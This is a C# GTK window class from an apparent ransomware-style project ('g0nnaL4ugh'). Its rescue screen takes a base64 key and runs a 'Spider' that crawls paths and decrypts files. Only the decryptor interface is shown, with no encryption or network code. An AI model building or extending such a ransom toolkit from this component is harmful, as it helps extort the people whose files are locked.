using System;
using System.Timers;
using g0nnaL4ugh;
using g0nnaL4ugh.Crypto;
using Gtk;

public partial class MainWindow : Gtk.Window
{
    private bool isProcessing = false;
    private PathUtil pathUtil;
	private Timer myTimer;

    public MainWindow() : base(Gtk.WindowType.Toplevel)
    {
        Build();
		progressbar1.Visible = false;
		progressbar1.Adjustment.Value = 0;      
        wrong.Visible = false;
        pathUtil = new PathUtil();
    }

    protected void OnDeleteEvent(object sender, DeleteEventArgs a)
    {
        if (!this.isProcessing)
        {
            Application.Quit();
        }      
        a.RetVal = true;
    }

    protected void OnRescueBtnClicked(object sender, EventArgs e)
    {
        wrong.Visible = false;
        if (this.IsValidEntry(entry2.Text))
        {
            this.BeginDecryption();
        }else {
            wrong.Visible = true;
        }
    }

    private bool IsValidEntry(string text)
    {
        try
        {
            Convert.FromBase64String(entry2.Text);
        }
        catch(Exception)
        {
            return false;
        }
        return !string.IsNullOrEmpty(text);
    }

    private void BeginDecryption()
    {
        rescue.Sensitive = false;
        entry2.Sensitive = false;
        progressbar1.Visible = true;
        this.isProcessing = true;
		this.BeginProgressAnimation();
        Spider spider;
        Decrypter decrypter = new Decrypter();
        byte[] pwd = Convert.FromBase64String(entry2.Text);
        Console.WriteLine(pwd.Length);
        spider = new Spider(this.pathUtil, decrypter, pwd);
        spider.Spread();
        Console.WriteLine("Finished");
		this.StopProgressAnimation();
        MessageDialog messageDialog =
        new MessageDialog(this, DialogFlags.Modal, MessageType.Info,
        ButtonsType.Close, "Finished decrypting :D");
        messageDialog.Run();
        messageDialog.Destroy();
        this.Destroy();
        Application.Quit();      
    }

	private void ProgressAnimationEvent(object source, ElapsedEventArgs e)
    {
        var value = (progressbar1.Adjustment.Value + 5) % 105;
        progressbar1.Adjustment.Value = value;
    }
    
	private void BeginProgressAnimation()
    {
		myTimer = new Timer();
		myTimer.Elapsed += new ElapsedEventHandler(ProgressAnimationEvent);
        myTimer.Interval = 250;
        myTimer.Start();
    }

	private void StopProgressAnimation()
	{
		if (myTimer != null)
		{
			myTimer.Stop();
            progressbar1.Adjustment.Value = 0;
            progressbar1.Sensitive = false;	
		}      
	}
}
